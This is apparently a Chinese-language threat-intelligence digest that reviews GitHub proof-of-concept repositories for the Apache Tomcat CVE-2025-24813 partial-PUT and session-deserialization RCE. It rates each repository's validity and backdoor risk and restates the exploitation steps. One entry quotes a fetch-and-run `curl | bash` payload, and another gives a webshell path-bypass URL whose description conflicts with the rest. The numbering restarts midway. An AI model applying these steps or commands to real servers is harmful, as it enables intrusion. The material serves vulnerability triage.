CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它允许攻击者通过路径等价（'file.Name' 中的内部点）导致远程代码执行（RCE）或信息泄露，或通过启用了写入的 Default Servlet 向上传的文件中添加恶意内容。 根据漏洞库信息，该漏洞存在两种利用场景：

**信息泄露/文件注入：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   目标 URL 是公共上传目标 URL 的子目录。
*   攻击者知道安全敏感文件的名称。
*   安全敏感文件也通过部分 PUT 上传。

**远程代码执行：**

*   需要 Default Servlet 启用写入，默认是禁用的。
*   支持部分 PUT 请求，默认启用。
*   应用程序使用 Tomcat 基于文件的会话持久性与默认存储位置。
*   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析：**

提供的 Dockerfile 修改了 Tomcat 的 `web.xml` 和 `context.xml` 文件，启用了 Default Servlet 的写入功能，并配置了基于文件的会话持久性。这满足了漏洞利用的先决条件。

POC代码尝试利用文件上传漏洞，如果成功，可以向Tomcat服务器写入恶意文件，并利用反序列化漏洞执行任意命令。

**利用方式：**

1.  **检查Default Servlet是否可写:** POC首先尝试通过PUT请求写入文件来检查Default Servlet是否可写。
2.  **生成Payload:** 如果Default Servlet可写，POC会生成恶意payload，可以是一个简单的Java WebShell或更复杂的ysoserial payload。
3.  **上传和验证Payload:** POC通过分块PUT请求将payload上传到Tomcat服务器，并尝试访问上传的文件，以验证payload是否成功执行。
4.  **反序列化攻击(RCE):**  如果Tomcat配置满足反序列化攻击的条件，那么攻击者可以通过上传精心构造的序列化对象，利用存在漏洞的库执行任意代码。

**投毒风险：**

此仓库的投毒风险较低。Dockerfile 仅用于配置 Tomcat 以暴露漏洞，python脚本用于漏洞验证和利用，目的是远程命令执行。 唯一潜在的投毒风险在于：

*   `cve-2025-24813-poc.py`  下载的`ysoserial` 可能包含恶意gadget，但此风险可以通过检查下载源和ysoserial的hash值来降低。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的，如果目标环境满足先决条件，可以实现RCE或信息泄露。


**项目地址:** [ps-interactive/lab-cve-2025-24813](https://github.com/ps-interactive/lab-cve-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #44

**来源**: [CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md](../2025/CVE-2025-24813-sentilaso1_CVE-2025-24813-Apache-Tomcat-RCE-PoC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet的写入已启用（默认禁用），启用partial PUT，应用程序使用Tomcat基于文件的会话持久化，应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，利用 `file.Name` (内部点) 导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。漏洞存在于默认Servlet的写入功能启用时。

**有效性分析：**

提供的 Python 脚本 (CVE-2025-24813.py) 尝试利用此漏洞。脚本包含以下关键步骤：

1.  **检查可写Servlet：** `check_writable_servlet` 函数检查目标 URL 是否可通过 PUT 方法写入。
2.  **生成 Payload：** 脚本可以生成 ysoserial payload 或 Java payload。ysoserial payload 使用指定的 gadget 来执行命令。Java payload 将命令编译成 .class 文件并打包到 JAR 文件中。
3.  **上传 Payload：** `upload_and_verify_payload` 函数尝试将生成的 payload 上传到 `target_url/uploads/../sessions/{session_id}.session`。如果上传成功并返回 409 冲突，则脚本尝试发送一个带有伪造的JSESSIONID cookie的 GET 请求，并期望获得 500 内部服务器错误，这表明漏洞利用可能成功。

**投毒风险分析：**

该脚本存在少量投毒风险，风险点在于:
*   `generate_ysoserial_payload` 函数允许指定 `ysoserial_path` 和 `gadget`。虽然脚本本身没有植入恶意代码，但如果用户使用了被篡改的 ysoserial.jar 或选择了恶意的 gadget，则可能执行任意代码。用户需要自行验证 ysoserial 的来源和完整性。
* `remove_file` 函数尝试删除临时文件，如果由于权限或其他原因失败，可能会留下编译后的 Java 类文件。
总体代码逻辑是尝试复现和利用漏洞，未发现明显恶意代码。因此，投毒风险较低。

**利用方式：**

1.  **前提条件：** 确保目标 Tomcat 服务器满足漏洞利用的条件，特别是启用了默认 Servlet 的写入功能和 partial PUT。
2.  **确定目标 URL 和会话 ID：** 找到 Tomcat 服务器的 uploads 目录和目标应用程序使用的会话 ID。session id可以从服务器获取，或者脚本中指定，上传的session文件名由此决定。
3.  **生成 Payload：** 使用脚本提供的 `generate_ysoserial_payload` 或 `generate_java_payload` 函数生成包含恶意命令的 payload。
4.  **上传 Payload：** 使用 `upload_and_verify_payload` 函数将生成的 payload 上传到 Tomcat 服务器的会话目录。
5.  **触发反序列化：** 脚本通过发送带有特定 Cookie 的 GET 请求来触发反序列化。如果一切顺利，服务器将执行 payload 中的恶意命令。

**项目地址:** [sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC](https://github.com/sentilaso1/CVE-2025-24813-Apache-Tomcat-RCE-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #45

**来源**: [CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md](../2025/CVE-2025-24813-thebringerofdeath789_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入 (默认关闭), 支持Partial PUT (默认开启), 目标URL存在子目录关系, 攻击者已知敏感文件名 (信息泄露); 或 使用了 Tomcat 的文件Session持久化 (默认位置), 存在可被利用的反序列化库 (RCE)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 中，是一个路径等价漏洞，结合部分PUT请求功能，可能导致远程代码执行、信息泄露或文件内容被恶意篡改。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的PoC代码，可以判断该PoC代码具有一定的有效性。搜索结果表明，该漏洞已被积极利用，并且存在公开可用的利用方法。PoC代码利用了 Tomcat 的 partial PUT 功能，结合路径遍历，将恶意payload上传到session目录，通过触发反序列化漏洞来实现远程代码执行。

**投毒风险分析：**

PoC代码中存在一定的投毒风险，风险比例约为5%。具体分析如下：

*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
